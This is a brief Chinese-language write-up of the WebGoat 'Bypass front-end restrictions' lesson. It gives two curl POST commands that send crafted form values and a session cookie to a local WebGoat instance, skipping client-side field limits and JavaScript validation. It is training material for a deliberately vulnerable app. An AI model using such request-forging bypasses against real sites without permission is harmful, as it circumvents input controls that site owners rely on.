# Bypass front-end restrictions

很简单，要过前端代码限制。

## Task1
很简单
``` bash
curl -vn -H "Referer: http://baidu.com/" -H "Cookie: JSESSIONID=574A15072CE7BA353B3CF93D8AE1AB92" -X POST -d "select=option3&radio=option3&checkbox=1&shortInput=123123" http://127.0.0.1:8080/WebGoat/BypassRestrictions/FieldRestrictions
```

## Task2

一样道理

```bash
curl -vn -H "Referer: http://baidu.com/" -H "Cookie: JSESSIONID=574A15072CE7BA353B3CF93D8AE1AB92" -X POST -d "field1=abcd&field2=abcd&field3=**&field4=a&field5=ababa&field6=123123123&field7=1231231&error=0" http://127.0.0.1:8080/WebGoat/BypassRestrictions/frontendValidation/
```